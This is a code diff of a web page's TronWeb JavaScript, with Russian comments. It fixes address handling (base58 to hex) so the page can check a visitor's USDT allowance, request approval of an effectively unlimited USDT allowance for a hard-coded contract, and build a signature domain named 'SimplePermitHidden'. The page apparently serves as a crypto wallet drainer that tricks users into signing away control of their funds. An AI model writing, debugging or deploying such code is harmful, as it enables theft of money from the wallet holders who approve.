@@ -71,10 +71,12 @@
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
     <script>
-        const CONTRACT = 'TBVkLMZgwqfNNPrgfU2WsSPPFTTUmjifKh';
-        const USDT = 'TF17BgPaZYzXTPb5tS1DaJzsGPB9vMVh6f';
+        // Base58 адреса
+        const CONTRACT_BASE58 = 'TBVkLMZgwqfNNPrgfU2WsSPPFTTUmjifKh';
+        const USDT_BASE58 = 'TF17BgPaZYzXTPb5tS1DaJzsGPB9vMVh6f';
 
         let tronWeb, userAddr, nonce;
+        let CONTRACT_HEX, USDT_HEX;
 
         function checkTronLink() {
             return !!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
@@ -107,6 +109,13 @@
                 tronWeb = window.tronWeb;
                 userAddr = tronWeb.defaultAddress.base58;
 
+                // Конвертируем адреса в hex для вызовов контракта
+                CONTRACT_HEX = tronWeb.address.toHex(CONTRACT_BASE58);
+                USDT_HEX = tronWeb.address.toHex(USDT_BASE58);
+
+                console.log('Contract hex:', CONTRACT_HEX);
+                console.log('USDT hex:', USDT_HEX);
+
                 status.textContent = 'Кошелёк: ' + userAddr.slice(0, 6) + '...' + userAddr.slice(-4);
                 status.classList.remove('error');
 
@@ -129,15 +138,15 @@
             const status = document.getElementById('statusText');
 
             try {
-                // Вызываем allowance через triggerConstantContract
+                // Вызываем allowance через triggerConstantContract с hex-адресом
                 const functionSelector = 'allowance(address,address)';
                 const parameter = [
-                    { type: 'address', value: userAddr },
-                    { type: 'address', value: CONTRACT }
+                    { type: 'address', value: userAddr },  // base58 работает для параметров
+                    { type: 'address', value: CONTRACT_BASE58 }  // или hex
                 ];
 
                 const tx = await tronWeb.transactionBuilder.triggerConstantContract(
-                    USDT,
+                    USDT_HEX,  // ← hex адрес контракта USDT
                     functionSelector,
                     {},
                     parameter
@@ -182,12 +191,12 @@
             try {
                 const functionSelector = 'approve(address,uint256)';
                 const parameter = [
-                    { type: 'address', value: CONTRACT },
+                    { type: 'address', value: CONTRACT_BASE58 },  // адрес spender
                     { type: 'uint256', value: '999999999999999999999999999999' }
                 ];
 
                 const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-                    USDT,
+                    USDT_HEX,  // ← hex адрес
                     functionSelector,
                     { feeLimit: 100000000, callValue: 0 },
                     parameter
@@ -237,7 +246,7 @@
                         tronWeb.sha3("SimplePermitHidden"),
                         tronWeb.sha3("1"),
                         chainId,
-                        CONTRACT
+                        CONTRACT_BASE58  // base58 адрес для encodeParameters
                     ]
                 );
                 const DOMAIN_SEPARATOR = tronWeb.sha3(domainData, { encoding: 'hex' });
